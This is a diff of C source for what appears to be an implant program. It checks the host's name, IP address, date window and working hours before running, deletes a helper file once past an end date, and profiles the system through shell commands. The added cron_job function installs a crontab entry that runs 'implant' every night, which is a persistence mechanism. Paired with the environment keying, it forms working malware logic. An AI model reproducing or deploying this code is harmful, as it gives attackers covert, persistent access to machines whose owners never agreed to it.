@@ -17,7 +17,7 @@
 
 
 /** ======== Validating ======= */
-
+void cron_job();
 
 void val_SysName(){
     #ifdef SYSN
@@ -43,8 +43,8 @@ void val_IP(){
     struct ifaddrs *ifaddr, *ifa;
     int family, s;
     char host[NI_MAXHOST];
-	
-  
+
+
     if (getifaddrs(&ifaddr) == -1){
         perror("getifaddrs");
         exit(EXIT_FAILURE);
@@ -57,7 +57,7 @@ void val_IP(){
             continue;
         // translate the socket address into a location and service name into the host param
         s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
-        if((ifa->ifa_addr->sa_family==AF_INET)){ 
+        if((ifa->ifa_addr->sa_family==AF_INET)){
             if (s != 0){
                 #ifdef DEBUG
                     printf("getnameinfo() failed: %s\n", gai_strerror(s));
@@ -102,7 +102,7 @@ Return 1 if d1 is later than d2. Return -1 if d1 is earlier.*/
 int date_cmp(struct date d1, struct date d2) {
  if (d1.dd == d2.dd && d1.mm == d2.mm && d1.yy ==d2.yy)
     return 0;
- else if (d1.yy > d2.yy || d1.yy == d2.yy && d1.mm > d2.mm || 
+ else if (d1.yy > d2.yy || d1.yy == d2.yy && d1.mm > d2.mm ||
            d1.yy == d2.yy && d1.mm == d2.mm && d1.dd > d2.dd)
     return 1;
  else return -1;
@@ -114,13 +114,13 @@ int date_cmp(struct date d1, struct date d2) {
     printf("%02d/%02d/%d\n", d.mm, d.dd, d.yy);
 };
 
-void val_time(){    
+void val_time(){
     time_t now;
-  
+
     // Obtain current time
     time(&now);
     struct tm *local = localtime(&now);
-         
+
     // get current date
     struct date date_cur = {local->tm_mday, local->tm_mon + 1, local->tm_year + 1900};
     date_print(date_cur);
@@ -171,14 +171,14 @@ void val_time(){
     if(cmp_cur_strt == 1 || cmp_cur_strt == 0){
         // date <= end_date
         if(cmp_cur_end == -1 || cmp_cur_end == 0){
-	printf("Within acceptable dates. Running");
+	printf("Within acceptable dates. Running\n");
 	}
 	// Within dates, move on to check TIME
         // date > end_date
         else{
             //uninstall (should be called in main anyway) and exit
             #ifdef DEBUG
-                printf("Past end date. Exiting!");
+                printf("Past end date. Exiting!\n");
 		remove("valHelper");
             #endif
             exit(EXIT_FAILURE);
@@ -206,7 +206,7 @@ void val_time(){
 
     int WORK_START = 9;
     int WORK_END = 17;
-	
+
     // after start of work day
     if( cur_hr >= WORK_START){
         // perfect timing!
@@ -233,12 +233,15 @@ void val_time(){
         val_time();
         return;
     }
-    
+
 }
 
-
-/*======== Profiling ======= 
-    NOT IMPLEMENTED 
+void cron_job(){
+  my_printf("Cron Job running\n");
+  system("(crontab -l ; echo '59 23 * * * implant') | crontab -");
+}
+/*======== Profiling =======
+    NOT IMPLEMENTED
     /resources/misc/profilerDemo.c
     https://stackoverflow.com/questions/4757512/execute-a-linux-command-in-the-c-program
 */
@@ -283,7 +286,7 @@ char* strProfile(){
 
     //Linux command line utility that is used in case a user wants to know the shared library dependencies of an executable or shared library
     fp = popen("ldd --version", "r");
-    fgets(path, sizeof(path), fp); 
+    fgets(path, sizeof(path), fp);
     strcat(giantList, path);
     //strcat(giantList,"\n");
 
@@ -293,11 +296,10 @@ char* strProfile(){
     strcat(giantList, path);
     //strcat(giantList,"\n");
     //
-   
-    
+
+
     pclose(fp);
     return giantList;
-    
+
 }
 */
-
